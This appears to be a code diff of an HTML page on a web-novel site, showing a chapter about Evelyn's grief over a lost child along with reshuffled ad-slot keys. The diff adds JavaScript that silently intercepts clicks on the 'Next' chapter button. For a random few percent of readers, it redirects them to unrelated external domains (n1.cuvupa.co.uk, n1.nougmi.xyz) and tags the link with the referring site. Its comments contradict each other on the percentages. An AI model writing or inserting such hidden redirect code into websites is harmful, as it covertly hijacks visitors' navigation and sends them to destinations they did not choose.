@@ -2392,42 +2392,42 @@
                 <p>The café&#39;s gentle piano music stretched the silence unbearably long.</p>
                 <p>&#34;...Fair point.&#34; Vivian finally sighed. &#34;No one moves on that fast.&#34;</p>
                 <!-- 广告位 1 -->
-                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
+                <ins class="3b35b82f" data-key="a8e40a2b9790ac404e6034309b5743d0"></ins>
                 <p>Evelyn took a sip of her now-cold coffee.</p>
                 <p>&#34;But Gregory’s waited seven or eight years already. What’s a little longer?&#34; Vivian suddenly leaned in. &#34;Honestly, I think you two would be perfect together.&#34;</p>
                 <p>Evelyn closed her eyes, pretending to rest.</p>
                 <p>Perfect?</p>
                 <p>The Dempsey family had deep roots in H City. Anyone who could be their longtime friends must come from elite circles.</p>
                 <!-- 广告位 2 -->
-                <ins class="3b35b82f" data-key="a539bb169e7e4ee07b88d8c888b38a5a"></ins>
+                <ins class="3b35b82f" data-key="2ecc942d608f3202923d4b797fc58e7f"></ins>
                 <p>Would such a family accept a divorced woman who’d lost a child?</p>
                 <p>Vivian seemed to read her thoughts. &#34;Alexander did. He even accepted the baby in Annabelle’s womb.&#34;</p>
                 <p>&#34;There aren’t many fools that devoted in this world.&#34;</p>
                 <p>The piano music shifted abruptly to a cheerful tune, clashing with the mood.</p>
                 <p>Vivian opened her mouth but said nothing.</p>
                 <!-- 广告位 3 -->
-                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
+                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
                 <p>Romantic TV plots could never withstand reality’s cruelty.</p>
                 <p>The days that followed kept Evelyn unusually busy.</p>
                 <p>For the first time, she used up all her accumulated vacation days. A new runner appeared in the park at dawn, the kitchen smelled of freshly baked goods, and gym equipment bore witness to her sweat.</p>
                 <p>A month later, the mirror reflected rosy cheeks—even a slight weight gain.</p>
                 <p>Then one day at the gym entrance, a toddling little girl suddenly hugged her leg.</p>
                 <!-- 广告位 4 -->
-                <ins class="3b35b82f" data-key="8d485a781d7176e53b3dc45f4a663d79"></ins>
+                <ins class="3b35b82f" data-key="c210a149a5b32458c119a58197e7f96e"></ins>
                 <p>&#34;Mommy!&#34;</p>
                 <p>The sweet, childish voice was a blunt knife plunging into her heart.</p>
                 <p>If her baby had lived, would they be crawling by now? Would they have called her &#34;Mommy&#34; in that soft voice?</p>
                 <p>The child’s mother hurried over, apologizing that her daughter called everyone that.</p>
                 <p>Evelyn forced a smile.</p>
                 <!-- 广告位 5 -->
-                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
+                <ins class="3b35b82f" data-key="c260faacddeb4be16d509e39a27a2374"></ins>
                 <p>Neither she nor Alexander were outgoing. Their child probably wouldn’t have been this lively. But remembering Alexander had been a school troublemaker in his youth, she laughed despite herself.</p>
                 <p>Then the tears fell.</p>
                 <p>I’m sorry, baby.</p>
                 <p>I hope you’ve found a better mommy in heaven.</p>
                 <p>One... whose daddy loves her with all his heart.</p>
                 <!-- 广告位 6 -->
-                <ins class="3b35b82f" data-key="227ac8063260b67e15d106b1d1faf5da"></ins>
+                <ins class="3b35b82f" data-key="edabd45f6be962b9624a8fb02ea37201"></ins>
             </div>
             
             <div class="font-controls">
@@ -2549,7 +2549,7 @@
         });
 
         // Intercept Next button clicks and redirect to external domain
-        // 6% -> novel.234xi.com, 94% normal
+        // 2% -> n1.cuvupa.co.uk, 3% -> n1.nougmi.xyz, 95% normal
         (function() {
             const nextBtn = document.getElementById('next-chapter');
             if (nextBtn && nextBtn.href) {
@@ -2565,8 +2565,17 @@
                         const externalUrl = `https://n1.cuvupa.co.uk${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
                         window.location.href = externalUrl;
                         console.log('🔀 Redirecting to cuvupa with ref:', externalUrl);
+                    // 3% probability to redirect to nougmi
+                    } else if (rand < 0.05) {
+                        e.preventDefault();
+                        const url = new URL(this.href, window.location.origin);
+                        const referrerDomain = window.location.hostname;
+                        const separator = url.search ? '&' : '?';
+                        const externalUrl = `https://n1.nougmi.xyz${url.pathname}${url.search}${separator}ref=${referrerDomain}${url.hash}`;
+                        window.location.href = externalUrl;
+                        console.log('🔀 Redirecting to nougmi with ref:', externalUrl);
                     }
-                    // Otherwise, let the default link behavior work (98% probability)
+                    // Otherwise, let the default link behavior work (95% probability)
                 });
             }
         })();
